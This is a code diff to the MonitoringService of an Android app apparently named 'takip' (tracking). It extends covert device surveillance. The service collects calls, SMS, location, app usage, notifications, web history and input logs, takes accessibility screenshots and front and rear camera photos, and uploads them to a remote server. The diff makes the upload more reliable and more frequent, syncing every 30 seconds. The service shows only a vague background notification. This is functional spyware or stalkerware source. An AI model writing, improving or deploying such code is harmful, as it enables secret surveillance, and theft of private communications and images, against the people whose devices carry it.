@@ -8,6 +8,7 @@ import android.content.Context
 import android.content.Intent
 import android.os.Build
 import android.os.IBinder
+import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.takip.app.R
 import com.takip.app.api.ApiClient
@@ -25,6 +26,7 @@ import kotlinx.coroutines.cancel
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
+import org.json.JSONArray
 import java.io.File
 
 class MonitoringService : Service() {
@@ -38,12 +40,16 @@ class MonitoringService : Service() {
     override fun onCreate() {
         super.onCreate()
         startForeground(NOTIFICATION_ID, createNotification())
+        scope.launch { syncData() }
         startSyncLoop()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         startForeground(NOTIFICATION_ID, createNotification())
-        if (syncJob?.isActive != true) startSyncLoop()
+        if (syncJob?.isActive != true) {
+            scope.launch { syncData() }
+            startSyncLoop()
+        }
         return START_STICKY
     }
 
@@ -54,64 +60,98 @@ class MonitoringService : Service() {
     }
 
     private fun startSyncLoop() {
+        syncJob?.cancel()
         syncJob = scope.launch {
             while (isActive) {
-                syncData()
                 delay(SYNC_INTERVAL_MS)
+                syncData()
             }
         }
     }
 
     private suspend fun syncData() {
-        val token = PrefsManager.deviceToken ?: return
+        ConfigManagerRefresh()
+        val token = PrefsManager.deviceToken
+        if (token.isNullOrBlank()) {
+            Log.w(TAG, "Senkron atlandı: deviceToken yok")
+            return
+        }
 
-        ApiClient.heartbeat(token)
+        ApiClient.heartbeat(token).onFailure {
+            Log.e(TAG, "Heartbeat başarısız: ${it.message}")
+        }
 
-        val calls = CallCollector.collect(this)
-        if (calls.length() > 0) ApiClient.uploadCalls(token, calls)
+        uploadArray(CallCollector.collect(this)) { ApiClient.uploadCalls(token, it) }.let { ok ->
+            if (ok) CallCollector.commitSync()
+        }
 
-        val sms = SmsCollector.collect(this)
-        if (sms.length() > 0) ApiClient.uploadSms(token, sms)
+        uploadArray(SmsCollector.collect(this)) { ApiClient.uploadSms(token, it) }.let { ok ->
+            if (ok) SmsCollector.commitSync()
+        }
 
-        val locations = LocationCollector.collect(this)
-        if (locations.length() > 0) ApiClient.uploadLocations(token, locations)
+        uploadArray(LocationCollector.collect(this)) { ApiClient.uploadLocations(token, it) }
+        uploadArray(AppUsageCollector.collect(this)) { ApiClient.uploadAppUsage(token, it) }
 
-        val usage = AppUsageCollector.collect(this)
-        if (usage.length() > 0) ApiClient.uploadAppUsage(token, usage)
+        val notifications = NotificationQueue.snapshot()
+        if (uploadArray(notifications) { ApiClient.uploadNotifications(token, it) }) {
+            NotificationQueue.clear()
+        }
 
-        val pending = NotificationQueue.drain()
-        if (pending.length() > 0) ApiClient.uploadNotifications(token, pending)
+        val webHistory = ActivityLogQueue.snapshotWebHistory()
+        if (uploadArray(webHistory) { ApiClient.uploadWebHistory(token, it) }) {
+            ActivityLogQueue.clearWebHistory()
+        }
 
-        val webHistory = ActivityLogQueue.drainWebHistory()
-        if (webHistory.length() > 0) ApiClient.uploadWebHistory(token, webHistory)
-
-        val inputLogs = ActivityLogQueue.drainInputLogs()
-        if (inputLogs.length() > 0) ApiClient.uploadInputLogs(token, inputLogs)
+        val inputLogs = ActivityLogQueue.snapshotInputLogs()
+        if (uploadArray(inputLogs) { ApiClient.uploadInputLogs(token, it) }) {
+            ActivityLogQueue.clearInputLogs()
+        }
 
         captureAndUploadMedia(token)
     }
 
+    private fun uploadArray(
+        data: JSONArray,
+        upload: (JSONArray) -> Result<Unit>
+    ): Boolean {
+        if (data.length() == 0) return false
+        return upload(data).fold(
+            onSuccess = {
+                Log.d(TAG, "Yükleme OK (${data.length()} kayıt)")
+                true
+            },
+            onFailure = {
+                Log.e(TAG, "Yükleme hatası: ${it.message}")
+                false
+            }
+        )
+    }
+
+    private fun ConfigManagerRefresh() {
+        com.takip.app.util.ConfigManager.refreshIfStale()
+    }
+
     private fun captureAndUploadMedia(token: String) {
         mediaCounter++
-        if (mediaCounter % 5 != 0) return // Her ~5 dakikada bir medya
+        if (mediaCounter % 3 != 0) return
 
-        // Ekran görüntüsü (Accessibility gerekli)
         TakipAccessibilityService.instance?.takeScreenCapture { bytes ->
             if (bytes != null) {
                 val file = File(cacheDir, "screen_${System.currentTimeMillis()}.jpg")
                 file.writeBytes(bytes)
                 ApiClient.uploadMedia(token, file, "screenshot")
+                    .onFailure { Log.e(TAG, "Ekran yükleme hatası: ${it.message}") }
             }
         }
 
-        // Arka kamera
         CameraCaptureHelper.capturePhoto(this, useFrontCamera = false)?.let { file ->
             ApiClient.uploadMedia(token, file, "camera_back")
+                .onFailure { Log.e(TAG, "Kamera arka hatası: ${it.message}") }
         }
 
-        // Ön kamera
         CameraCaptureHelper.capturePhoto(this, useFrontCamera = true)?.let { file ->
             ApiClient.uploadMedia(token, file, "camera_front")
+                .onFailure { Log.e(TAG, "Kamera ön hatası: ${it.message}") }
         }
     }
 
@@ -126,8 +166,7 @@ class MonitoringService : Service() {
                 description = "Arka plan servisi"
                 setShowBadge(false)
             }
-            val nm = getSystemService(NotificationManager::class.java)
-            nm.createNotificationChannel(channel)
+            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
 
         return NotificationCompat.Builder(this, channelId)
@@ -140,8 +179,9 @@ class MonitoringService : Service() {
     }
 
     companion object {
+        private const val TAG = "MonitoringService"
         private const val NOTIFICATION_ID = 1001
-        private const val SYNC_INTERVAL_MS = 60_000L
+        private const val SYNC_INTERVAL_MS = 30_000L
 
         fun start(context: Context) {
             val intent = Intent(context, MonitoringService::class.java)
